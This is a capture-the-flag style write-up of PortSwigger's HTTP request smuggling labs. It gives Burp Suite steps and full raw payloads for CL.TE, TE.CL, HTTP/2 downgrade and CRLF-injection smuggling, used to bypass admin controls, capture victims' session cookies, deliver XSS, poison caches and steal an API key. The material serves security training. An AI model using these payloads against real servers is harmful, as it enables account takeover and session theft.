# Portswigger
## HTTP Request Smuggling
### HTTP request smuggling, basic CL.TE vulnerability
```bash

# This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding. The front-end server rejects requests that aren't using the GET or POST method.

# To solve the lab, smuggle a request to the back-end server, so that the next request processed by the back-end server appears to use the method GPOST. 

Refresh the page
Go to: HTTP history
Find:

GET / HTTP/1.1

Send to repeater
Go to Repeater -> Un-check "Update Content-Length"
Change:

GET / HTTP/1.1

To

POST / HTTP/1.1

Change:

Connection: closed

To

Connection: keep-alive

Add:

Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

G

Send the request twice
Response:

HTTP/1.1 403 Forbidden

"Unrecognized method GPOST"

```

![image](https://0xc0rvu5.github.io/docs/assets/images/20220606224149.png)

### HTTP request smuggling, basic TE.CL vulnerability
```bash

# This lab involves a front-end and back-end server, and the back-end server doesn't support chunked encoding. The front-end server rejects requests that aren't using the GET or POST method.

# To solve the lab, smuggle a request to the back-end server, so that the next request processed by the back-end server appears to use the method `GPOST`.

Refresh the page
Go to: HTTP history
Find:

GET / HTTP/1.1

Send to repeater
Go to Repeater -> Un-check "Update Content-Length"
Right-click request -> Extensions -> HTTP Request Smuggler -> HTTP Request Smuggler -> Smuggle probe -> OK
Change:

GET / HTTP/1.1

To

POST / HTTP/1.1

Change:

Connection: closed

To

Connection: keep-alive

Add:

Content-length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0\r\n\r\n

Send the request twice
Response:

HTTP/1.1 403 Forbidden

"Unrecognized method GPOST"

```

![image](https://0xc0rvu5.github.io/docs/assets/images/20220606231055.png)

### HTTP request smuggling, obfuscating the TE header
```bash

# This lab involves a front-end and back-end server, and the two servers handle duplicate HTTP request headers in different ways. The front-end server rejects requests that aren't using the GET or POST method.

# To solve the lab, smuggle a request to the back-end server, so that the next request processed by the back-end server appears to use the method `GPOST`.

Refresh the page
Go to: HTTP history
Find:

GET / HTTP/1.1

Send to repeater
Go to Repeater -> Un-check "Update Content-Length"
Right-click request -> Extensions -> HTTP Request Smuggler -> HTTP Request Smuggler -> Smuggle probe -> OK
Change:

GET / HTTP/1.1

To

POST / HTTP/1.1

Change:

Connection: closed

To

Connection: keep-alive

Add:

Content-length: 4
Transfer-Encoding: chunked
Transfer-Encoding: chewbacca

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0\r\n\r\n

Send the request twice
Response:

HTTP/1.1 403 Forbidden

"Unrecognized method GPOST"

```

![image](https://0xc0rvu5.github.io/docs/assets/images/20220606233413.png)

### HTTP request smuggling, confirming a CL.TE vulnerability via differential responses
```bash

# This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding.

# To solve the lab, smuggle a request to the back-end server, so that a subsequent request for `/` (the web root) triggers a 404 Not Found response.

Refresh the page
Go to: HTTP history
Find:

GET / HTTP/1.1

Send to repeater
Go to Repeater -> Un-check "Update Content-Length"
Right-click request -> Extensions -> HTTP Request Smuggler -> HTTP Request Smuggler -> Smuggle probe -> OK
Change:

GET / HTTP/1.1

To

POST / HTTP/1.1

Change:

Connection: closed

To

Connection: keep-alive

Note there are 30 characters from the beginning of "Transfer-Encoding: chunked" to the beginning of "GET /404 HTTP/1.1"
Add:

Content-Type: application/x-www-form-urlencoded
Content-Length: 30
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
Foo: 2

Send the request twice
Response:

HTTP/1.1 404 Not Found

```

![image](https://0xc0rvu5.github.io/docs/assets/images/20220607000811.png)

### HTTP request smuggling, confirming a TE.CL vulnerability via differential responses
```bash

# This lab involves a front-end and back-end server, and the back-end server doesn't support chunked encoding.

# To solve the lab, smuggle a request to the back-end server, so that a subsequent request for `/` (the web root) triggers a 404 Not Found response.

Refresh the page
Go to: HTTP history
Find:

GET / HTTP/1.1

Send to repeater
Go to Repeater -> Un-check "Update Content-Length"
Right-click request -> Extensions -> HTTP Request Smuggler -> HTTP Request Smuggler -> Smuggle probe -> OK
Change:

GET / HTTP/1.1

To

POST / HTTP/1.1

Change:

Connection: closed

To

Connection: keep-alive

Add:

Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

5e
POST /404 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

X=1
0\r\n\r\n

Send the request twice
Response:

HTTP/1.1 404 Not Found

```

![image](https://0xc0rvu5.github.io/docs/assets/images/20220607002801.png)

### Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability
```bash

# This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding. There's an admin panel at `/admin`, but the front-end server blocks access to it.

# To solve the lab, smuggle a request to the back-end server that accesses the admin panel and deletes the user `carlos`.

Refresh the page
Go to: HTTP history
Find:

GET / HTTP/1.1

Send to repeater
Go to Repeater -> Un-check "Update Content-Length"
Right-click request -> Extensions -> HTTP Request Smuggler -> HTTP Request Smuggler -> Smuggle probe -> OK
Change:

GET / HTTP/1.1

To

POST / HTTP/1.1

Change:

Connection: closed

To

Connection: keep-alive

**Disregard "Origin: localhost" in photos -- testing purposes and irrelevant**
Add:

Content-Type: application/x-www-form-urlencoded
Content-Length: 28
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1\r\n\r\n

Send the request twice
Response:

HTTP/1.1 401 Unauthorized

"Admin interface only available to local users"

Change to:

Content-Type: application/x-www-form-urlencoded
Content-Length: 45
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost\r\n\r\n

Response:

HTTP/1.1 200 OK

<a href="/admin/delete?username=carlos">

Change to:

Content-Type: application/x-www-form-urlencoded
Content-Length: 68
Transfer-Encoding: chunked

0

GET /admin/delete?username=carlos HTTP/1.1
Host: localhost\r\n\r\n

Response:

HTTP/1.1 200 OK

```

![image](https://0xc0rvu5.github.io/docs/assets/images/20220607010847.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220607010011.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220607010503.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220607010221.png)

### Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability
```bash

# This lab involves a front-end and back-end server, and the back-end server doesn't support chunked encoding. There's an admin panel at `/admin`, but the front-end server blocks access to it.

# To solve the lab, smuggle a request to the back-end server that accesses the admin panel and deletes the user `carlos`.

Refresh the page
Go to: HTTP history
Find:

GET / HTTP/1.1

Send to repeater
Go to Repeater -> Un-check "Update Content-Length"
Right-click request -> Extensions -> HTTP Request Smuggler -> HTTP Request Smuggler -> Smuggle probe -> OK
Change:

GET / HTTP/1.1

To

POST / HTTP/1.1

Change:

Connection: closed

To

Connection: keep-alive

Add:

Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

60
POST /admin HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0\r\n\r\n

Send twice
Response:

HTTP/1.1 401 Unauthorized

Change to:

Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

71
POST /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0\r\n\r\n

Send twice
Response:

HTTP/1.1 200 OK

<a href="/admin/delete?username=carlos">

Change to:

Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

87
GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0\r\n\r\n

Send twice
Response:

HTTP/1.1 302 Found

```

![image](https://0xc0rvu5.github.io/docs/assets/images/20220607190455.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220607191345.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220607192115.png)

### Exploiting HTTP request smuggling to reveal front-end request rewriting
```bash

# This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding.

# There's an admin panel at /admin, but it's only accessible to people with the IP address 127.0.0.1. The front-end server adds an HTTP header to incoming requests containing their IP address. It's similar to the X-Forwarded-For header but has a different name.

# To solve the lab, smuggle a request to the back-end server that reveals the header that is added by the front-end server. Then smuggle a request to the back-end server that includes the added header, accesses the admin panel, and deletes the user carlos. 

Refresh the page
Go to: HTTP history
Find:

GET / HTTP/1.1

Send to repeater
Go to Repeater -> Un-check "Update Content-Length"
Right-click request -> Extensions -> HTTP Request Smuggler -> HTTP Request Smuggler -> Smuggle probe -> OK
Change:

GET / HTTP/1.1

To

POST / HTTP/1.1

Change:

Connection: closed

To

Connection: keep-alive

Add:

Content-Length: 124
Transfer-Encoding: chunked

0

POST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 200
Connection: close

search=test

Send twice
Copy "search"
Go to response and paste into search:

"Search"

Find:

0 search results for 'testPOST / HTTP/1.1
X-BTDgAM-Ip: 73.211.233.216

Change:

Content-Type: application/x-www-form-urlencoded
Content-Length: 148
Transfer-Encoding: chunked

0

POST /admin HTTP/1.1
X-BTDgAM-Ip: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 16
Connection: close

c0rvu5=1

Send twice
Response:

HTTP/1.1 200 OK

<a href="/admin/delete?username=carlos">

Change:

Content-Length: 172
Transfer-Encoding: chunked

0

POST /admin/delete?username=carlos HTTP/1.1
X-BTDgAM-Ip: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 16
Connection: close

c0rvu5=1

Send twice
Response:

HTTP/1.1 302 Found

```

![image](https://0xc0rvu5.github.io/docs/assets/images/20220607203805.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220607204034.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220607203941.png)

### Exploiting HTTP request smuggling to capture other users' requests
```bash

# This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding.

# To solve the lab, smuggle a request to the back-end server that causes the next user's request to be stored in the application. Then retrieve the next user's request and use the victim user's cookies to access their account. 

# The lab simulates the activity of a victim user. Every few POST requests that you make to the lab, the victim user will make their own request. You might need to repeat your attack a few times to ensure that the victim user's request occurs as required. 

Refresh the page
Go to: "View post"
Comment:

comment

Name:

name

Email:

email@email.com

Click "Post Comment"

Go to: HTTP history
Find:

POST /post/comment HTTP/1.1

Send to repeater

Change:

csrf=P392aleZ7FVFsImjwBtLPEV0lnLBhljb&postId=8&comment=comment&name=name&email=email%40email.com&website=

To

csrf=P392aleZ7FVFsImjwBtLPEV0lnLBhljb&postId=8&name=name&email=email%40email.com&website=&comment=comment

Send
Go to:

https://ac231f741e17591fc0a901420014003e.web-security-academy.net/post?postId=8
Refresh the page
Note the additional comment added

Change request to: (It seemed to want the exact number of characters for the second "Content-Length:" to be 814, yet a second attempt it seemed to work just fine with "Content-Length: 814")

POST / HTTP/1.1
Host: ac231f741e17591fc0a901420014003e.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 263
Transfer-Encoding: chunked

0


POST /post/comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 800
Cookie: session=1wM797pU419R4gsRB5DPGd49ToQcxYVy

csrf=P392aleZ7FVFsImjwBtLPEV0lnLBhljb&postId=8&name=name&email=email%40email.com&website=&comment=comment

Send
Go to:

https://ac231f741e17591fc0a901420014003e.web-security-academy.net/post?postId=8
Refresh the page
Note the additional comment added (towards the end of the comment)

Cookie: victim-fingerprint=jdCIR7tzmDAXDRoUfeXax0fmBqaEeUm6; secret=aUAPdGh2bbl5DyTzHgpwp3mGBEFuixr4; session=Y8A0qcM8IHwcTeb4Amd5J0R8dZXe6dj4

Copy the session cookie:

Y8A0qcM8IHwcTeb4Amd5J0R8dZXe6dj4

Go to: 

POST /login HTTP/1.1

Intercept is on
Login as carlos:whatever
Paste the cookie into the "Cookie:" header
Send
Go to:

https://ac231f741e17591fc0a901420014003e.web-security-academy.net/login

Refresh the page

```

![image](https://0xc0rvu5.github.io/docs/assets/images/20220608003307.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220608003338.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220608004708.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220608004731.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220608004811.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220608004941.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220608005232.png)

### Exploiting HTTP request smuggling to deliver reflected XSS
```bash

# This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding.

# The application is also vulnerable to [reflected XSS](https://portswigger.net/web-security/cross-site-scripting/reflected) via the `User-Agent` header.

# To solve the lab, smuggle a request to the back-end server that causes the next user's request to receive a response containing an XSS exploit that executes `alert(1)`.

# The lab simulates the activity of a victim user. Every few POST requests that you make to the lab, the victim user will make their own request. You might need to repeat your attack a few times to ensure that the victim user's request occurs as required.

Go to: "View post"
Go to: HTTP history
Find:

GET /post?postId=6 HTTP/1.

Response:

<input required type="hidden" name="userAgent" value="Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0">

Alternatively, you can comment and review that the "UserAgent" header is indeed located in the request
Send to repeater
Change to:

POST / HTTP/1.1
Host: acec1f0f1ee346fbc0d3f58300bc007d.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 150
Transfer-Encoding: chunked

0


GET /post?postId=6 HTTP/1.1
User-Agent: a"/><script>alert(1)</script>
Content-Length: 5


x=1

```

![image](https://0xc0rvu5.github.io/docs/assets/images/20220608011400.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220608012719.png)

### Exploiting HTTP request smuggling to perform web cache poisoning
```bash

# This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding. The front-end server is configured to cache certain responses.

# To solve the lab, perform a request smuggling attack that causes the cache to be poisoned, such that a subsequent request for a JavaScript file receives a redirection to the exploit server. The poisoned cache should alert document.cookie. 

# The lab simulates the activity of a victim user. Every few POST requests that you make to the lab, the victim user will make their own request. You might need to repeat your attack a few times to ensure that the victim user's request occurs as required. 

Go to: "View post"
Find:

GET /post?postId=1 HTTP/1.1

Send to repeater
Change to:

POST / HTTP/1.1
Host: ac1b1f021f9d37dfc0341f9d006600f8.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 131
Transfer-Encoding: chunked

0

GET /post/next?postId=3 HTTP/1.1
Host: anything
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=1

Send until response:

HTTP/1.1 302 Found

Follow the redirection

"Host: anything"

Go to: "Go to exploit server"
File:

/post

Head:

HTTP/1.1 200 OK
Content-Type: text/javascript; charset=utf-8

Body:

alert(document.cookie)

Store
Change repeater content to:

POST / HTTP/1.1
Host: ac1b1f021f9d37dfc0341f9d006600f8.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 193
Transfer-Encoding: chunked

0

GET /post/next?postId=3 HTTP/1.1
Host: exploit-ac381fab1fda3721c0571f4a01fb00a2.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=1

GET /resources/js/tracking.js HTTP/1.1
Host: ac1b1f021f9d37dfc0341f9d006600f8.web-security-academy.net
Connection: close

Send until response:

HTTP/1.1 302 Found

```

![image](https://0xc0rvu5.github.io/docs/assets/images/20220608015943.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220608020013.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220608015511.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220608015848.png)

### Exploiting HTTP request smuggling to perform web cache deception
```bash

# This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding. The front-end server is caching static resources.

# To solve the lab, perform a request smuggling attack such that the next user's request causes their API key to be saved in the cache. Then retrieve the victim user's API key from the cache and submit it as the lab solution. You will need to wait for 30 seconds from accessing the lab before attempting to trick the victim into caching their API key.

# You can log in to your own account using the following credentials: wiener:peter 

# The lab simulates the activity of a victim user. Every few POST requests that you make to the lab, the victim user will make their own request. You might need to repeat your attack a few times to ensure that the victim user's request occurs as required. 

Refresh the page
Go to: HTTP history
Find:

GET / HTTP/1.1

Send to repeater
Change to:

POST / HTTP/1.1
Host: acfd1f471e3b9aa3c0ce30fa00f100f0.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 42
Transfer-Encoding: chunked

0

GET /my-account HTTP/1.1
X-Ignore: X

Send until response:

HTTP/1.1 302 Found

Go to in browser:

https://ac0e1f601ff91594c057254100cf00f8.web-security-academy.net/post?postId=2

Right-click "Home" -> Open Link in New Private Window
Refresh the page
Go to Burp -> Search
Input:

"Your API key"

Go

Find the URL end-point /resources/js/tracking.js
Go to response
Find:

Your API Key is: Z5jxoIEqnetOPwMuaUl4y3hN8PGAY6Mg

```

![image](https://0xc0rvu5.github.io/docs/assets/images/20220608021822.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220608021836.png)

### H2.CL request smuggling
```bash

# This lab is vulnerable to request smuggling because the front-end server downgrades HTTP/2 requests even if they have an ambiguous length.

# To solve the lab, perform a request smuggling attack that causes the victim's browser to load a malicious JavaScript file from the exploit server and call alert(document.cookie). The victim user accesses the home page every 10 seconds. 

# This lab supports HTTP/2 but doesn't advertise this via ALPN. To send HTTP/2 requests using Burp Repeater, you need to enable the Allow HTTP/2 ALPN override option and manually change the protocol to HTTP/2 using the Inspector. 

Refresh the page
Go to: HTTP history
Find:

GET / HTTP/1.1

Send to repeater
Right-click request -> Extensions -> HTTP Request Smuggler -> HTTP Request Smuggler -> HTTP/2 probe -> OK
Go to: Target -> Issues

"HTTP/2 TE desync v10a h2path"

To go: Repeater
Go to Repeater -> Un-check 'Update Content-Length' -> Check Allow HTTP/2 ALPN override
Go to Inspector -> Drop down 'Request Attributes' 
Protocol - HTTP/2

Repeater content:

POST / HTTP/2
Host: acc31f301eaaa518c055084e00cd007f.web-security-academy.net
Content-Length: 0

checkmate

Send twice

Response:

HTTP/2 404 Not Found

Go to: Target -> Site map -> current_website.com -> resources
Send to repeater
Send

Response:

HTTP/1.1 302 Found
Location: https://acc31f301eaaa518c055084e00cd007f.web-security-academy.net/resources/

Go to the first instance of repeater
Change:

POST / HTTP/2
Host: acc31f301eaaa518c055084e00cd007f.web-security-academy.net
Content-Length: 0

checkmate

To

POST / HTTP/2
Host: acc31f301eaaa518c055084e00cd007f.web-security-academy.net
Content-Length: 0

GET /resources HTTP/1.1
Host: check
Content-Length: 5


x=1

Response:

HTTP/2 302 Found
Location: https://check/resources/

Verify in the second instance of repeater
Request:

GET /resources HTTP/1.1

Response:

HTTP/1.1 302 Found
Location: https://check/resources/

Go to: "Go to exploit server"
File:
/resources 

Body:

alert(document.cookie)

Store
Go to the first instance of repeater
Change:

POST / HTTP/2
Host: acc31f301eaaa518c055084e00cd007f.web-security-academy.net
Content-Length: 0

GET /resources HTTP/1.1
Host: check
Content-Length: 5


x=1

To

POST / HTTP/2
Host: acc31f301eaaa518c055084e00cd007f.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 0

GET /resources HTTP/1.1
Host: exploit-ac181fa61ebea5f4c018085201bb007b.web-security-academy.net
Content-Length: 5

x=1

Send multiple times

**DO AGAIN**

```

![image](https://0xc0rvu5.github.io/docs/assets/images/20220608232933.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220608233025.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220608232656.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220608232719.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220609025101.png)

### Response queue poisoning via H2.TE request smuggling
```bash

# This lab is vulnerable to request smuggling because the front-end server downgrades HTTP/2 requests even if they have an ambiguous length.

# To solve the lab, delete the user carlos by using response queue poisoning to break into the admin panel at /admin. An admin user will log in approximately every 15 seconds.

# The connection to the back-end is reset every 10 requests, so don't worry if you get it into a bad state - just send a few normal requests to get a fresh connection. 

# This lab supports HTTP/2 but doesn't advertise this via ALPN. To send HTTP/2 requests using Burp Repeater, you need to enable the [Allow HTTP/2 ALPN override](https://portswigger.net/burp/documentation/desktop/http2#allow-http-2-alpn-override) option and manually [change the protocol to HTTP/2 using the Inspector](https://portswigger.net/burp/documentation/desktop/http2#changing-the-protocol-for-a-request).

Refresh the page
Go to: HTTP history
Find:

GET / HTTP/1.1

Send to repeater
Right-click request -> Extensions -> HTTP Request Smuggler -> HTTP Request Smuggler -> HTTP/2 probe -> OK
Go to: Target -> Issues

"HTTP/2 TE desync v10a h2path"

To go: Repeater
Go to Repeater -> Un-check 'Update Content-Length' -> Check Allow HTTP/2 ALPN override
Go to Inspector -> Drop down 'Request Attributes' 
Protocol - HTTP/2

Repeater content:

POST / HTTP/2
Host: ac0d1f9c1fee599fc066273f004b0084.web-security-academy.net
Transfer-Encoding: chunked

0

check

Response:

HTTP/2 404 Not Found

Change to:

POST / HTTP/2
Host: ac721fbe1f9049fac13b458800020020.web-security-academy.net
Transfer-Encoding: chunked

0

GET /asd HTTP/1.1
Host: ac721fbe1f9049fac13b458800020020.web-security-academy.net\r\n\r\n

Send repeatedly until response:

HTTP/2 302 Found

Set-Cookie: session=xxpoCCXbyeRiW48Xwl7VMysqiIpmPWwo; Secure; HttpOnly; SameSite=None

Copy cookie
Go to:

https://ac0d1f9c1fee599fc066273f004b0084.web-security-academy.net/

Ctrl+Shift+i
Refresh the page
Go to: "Admin panel"
Delete username "carlos"

```

![image](https://0xc0rvu5.github.io/docs/assets/images/20220609004814.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220609004438.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220609005106.png)

### HTTP/2 request smuggling via CRLF injection
```bash

# This lab is vulnerable to request smuggling because the front-end server downgrades HTTP/2 requests and fails to adequately sanitize incoming headers.

# To solve the lab, use an HTTP/2-exclusive request smuggling vector to gain access to another user's account. The victim accesses the home page every 15 seconds.

# If you're not familiar with Burp's exclusive features for HTTP/2 testing, please refer to the documentation for details on how to use them. 

# This lab supports HTTP/2 but doesn't advertise this via ALPN. To send HTTP/2 requests using Burp Repeater, you need to enable the Allow HTTP/2 ALPN override option and manually change the protocol to HTTP/2 using the Inspector. 

Enter any arbitrary value into the search bar
Go to: HTTP history
Find:

POST / HTTP/1.1

Send to repeater
Right-click request -> Extensions -> HTTP Request Smuggler -> HTTP Request Smuggler -> HTTP/2 probe -> OK
Go to: Target -> Issues

"HTTP/2 TE desync v10a h2path"

To go: Repeater
Go to Repeater -> Un-check 'Update Content-Length' -> Check Allow HTTP/2 ALPN override
Go to Inspector -> Drop down 'Request Attributes' 
Protocol - HTTP/2
Drop down 'Request Headers'
Add:
Name:

foo

Body:

bar\r\n\r\n
Transfer-Encoding: chunked

We are in kettled territory now
Request:

0

c0rvu5

Send twice
Response:

HTTP/2 404 Not Found

Request:

0

POST / HTTP/1.1
Host: ac581f0c1f672700c0e701c800ed0039.web-security-academy.net
Cookie: session=f0CKZGnbfmDBul3gEZQ6zrKQdJ5QhwXZ; _lab_analytics=U07fPANMKCvzZCdMuu7AXsN2W5ZreywZEENI4w2E6AXKL2Hxe7iLIHVkJ1HFjPhbChLBDr2JIZNcvP4ktVYfKcFvBXKObEjxsuYKdqXM7YU4XPNBo5iutwFzxb1ZHsDGEKWI40sWlZG6KHdhyjzedjO2av1HTEYgdO8MZXb9veqMEMWaiUDywlNOW0ACVGLFXubZk2kA9HG0OpYfqsfZmEWkIL8igTcDXQ0wOniQelv7lvwPpA2yGU7d1LPPw9qx
Content-Length: 900

search=c0rvu5

Send twice
Go to:

https://ac581f0c1f672700c0e701c800ed0039.web-security-academy.net/

Refresh the page
Find:

fingerprint=OPuVrkYHi6zSXaEfkgX41zf612fDsGbD; secret=R5IT3feWduRM2t9ZMWITd9BrcTW04G24; session=E5A1gXTLhuJd2WBtaroipf1KdidHPxUA; _lab_analytics=gQkH435Lx25JN0WwCArZBU6r2XqZn5BZ6CCmDO2djPb1a08ZAIi6

Ctrl+Shift+i
Go to: Storage -> Cookies
Replace _lab_analytics and session tokens with the new-found tokens
Refresh the page

```

![image](https://0xc0rvu5.github.io/docs/assets/images/20220609033305.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220609033342.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220609033631.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220609034505.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220609032803.png)

### HTTP/2 request splitting via CRLF injection
```bash

# This lab is vulnerable to request smuggling because the front-end server downgrades HTTP/2 requests and fails to adequately sanitize incoming headers.

# To solve the lab, delete the user carlos by using response queue poisoning to break into the admin panel at /admin. An admin user will log in approximately every 10 seconds.

# The connection to the back-end is reset every 10 requests, so don't worry if you get it into a bad state - just send a few normal requests to get a fresh connection. 

# This lab supports HTTP/2 but doesn't advertise this via ALPN. To send HTTP/2 requests using Burp Repeater, you need to enable the Allow HTTP/2 ALPN override option and manually change the protocol to HTTP/2 using the Inspector. 

Refresh the page
Go to: HTTP history
Find:

POST / HTTP/1.1

Send to repeater
Change:

GET / HTTP/1.1

To

GET /x HTTP/1.1

Response:

HTTP/2 404 Not Found

Go to Repeater -> Check Allow HTTP/2 ALPN override
Go to Inspector -> Drop down 'Request Attributes' 
Protocol - HTTP/2
Go to Inspector -> Drop down 'Request Headers'
(Shift+Return == \r\n)
Add: 
Name:

foo

Value:

bar\r\n
\r\n
GET /x HTTP/1.1\r\n
Host: ac471fbd1fa09529c09a1e76003a0026.web-security-academy.net

Send @ intervals of 5 sec until response:

HTTP/2 302 Found

Set-Cookie: session=C6ZEGRJLF24fAyuume2vxptqiWKLH79K; Secure; HttpOnly; SameSite=None

Copy cookie
Go to: HTTP history
Find:

GET / HTTP/1.1

Send to repeater

Change:

GET / HTTP/1.1

To

GET /admin HTTP/1.1

Response:

HTTP/1.1 200 OK

<a href="/admin/delete?username=carlos">

Go to:

GET /admin/delete?username=carlos HTTP/1.1

Response:

HTTP/1.1 302 Found

```

![image](https://0xc0rvu5.github.io/docs/assets/images/20220609235923.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220610000107.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220610000150.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220610000421.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220610000519.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220610000620.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220610000642.png)

### Bypassing access controls via HTTP/2 request tunnelling
```bash

# This lab is vulnerable to request smuggling because the front-end server downgrades HTTP/2 requests and fails to adequately sanitize incoming header names. To solve the lab, access the admin panel at `/admin` as the `administrator` user and delete `carlos`.

# The front-end server doesn't reuse the connection to the back-end, so isn't vulnerable to classic request smuggling attacks. However, it is still vulnerable to [request tunnelling](https://portswigger.net/web-security/request-smuggling/advanced/request-tunnelling).

# This lab supports HTTP/2 but doesn't advertise this via ALPN. To send HTTP/2 requests using Burp Repeater, you need to enable the [Allow HTTP/2 ALPN override](https://portswigger.net/burp/documentation/desktop/http2#allow-http-2-alpn-override) option and manually [change the protocol to HTTP/2 using the Inspector](https://portswigger.net/burp/documentation/desktop/http2#changing-the-protocol-for-a-request).

Refresh the page
Go to: HTTP history
Find:

POST / HTTP/1.1

Send to repeater
Go to Repeater -> Check Allow HTTP/2 ALPN override
Go to Inspector -> Drop down 'Request Attributes' 
Protocol - HTTP/2
Go to Inspector -> Drop down 'Request Headers'
(Shift+Return == \r\n)
Add:
Name:

foo: bar\r\n\r\n
Host: abc

Value:

xyz

Response:

HTTP/2 504 Gateway Timeout

Server Error: Gateway Timeout (3) connecting to abc

Go to:

https://ace81fa51f70e0dac0950d4000930053.web-security-academy.net/

Change to:

https://ace81fa51f70e0dac0950d4000930053.web-security-academy.net/?search=c0rvu5

Go to: HTTP history
Find:

GET /?search=c0rvu5 HTTP/1.1

Send to repeater
Go to Inspector -> Drop down 'Request Attributes' 
Protocol - HTTP/2
Right-click the request -> Change request method
Send
Response:

HTTP/2 200 OK

Go to Inspector -> Drop down 'Request Headers'
(Shift+Return == \r\n)
Add:
Name:

foo: bar\r\n
Content-Length: 500\r\n
\r\n
search=c0rvu5

Value:

xyz

Send
Response:

HTTP/2 500 Internal Server Error

Server Error: Received only 174 of expected 3247 bytes of data

Change: ( > the tunneled 'Content-Length: 500' value) (The below example represents 510 characters)

search=c0rvu5

To

search=c0rvu5c0rvu5c0rvu5c0rvu5c0rvu5c0rvu5c0rvu5c0rvu5c0rvu5c0rvu5c0rvu5c0rvu5c0rvu5c0rvu5c0rvu5c0rvu5c0rvu5c0rvu5c0rvu5c0rvu5c0rvu5c0rvu5c0rvu5c0rvu5c0rvu5c0rvu5c0rvu5c0rvu5c0rvu5c0rvu5c0rvu5c0rvu5c0rvu5c0rvu5c0rvu5c0rvu5c0rvu5c0rvu5c0rvu5c0rvu5c0rvu5c0rvu5c0rvu5c0rvu5c0rvu5c0rvu5c0rvu5c0rvu5c0rvu5c0rvu5c0rvu5c0rvu5c0rvu5c0rvu5c0rvu5c0rvu5c0rvu5c0rvu5c0rvu5c0rvu5c0rvu5c0rvu5c0rvu5c0rvu5c0rvu5c0rvu5c0rvu5c0rvu5c0rvu5c0rvu5c0rvu5c0rvu5c0rvu5c0rvu5c0rvu5c0rvu5c0rvu5c0rvu5c0rvu5c0rvu5c0rvu5c0rvu5c0rvu5c0rvu5c0rvu5c0rvu

Send twice

Response:

HTTP/2 200 OK

0 search results for c0rvu5: xyz
Content-Length: 522
cookie: session=6ej2vKQ2WqtW59tNq9LMOZZXGftFyit8
X-SSL-VERIFIED: 0
X-SSL-CLIENT-CN: null
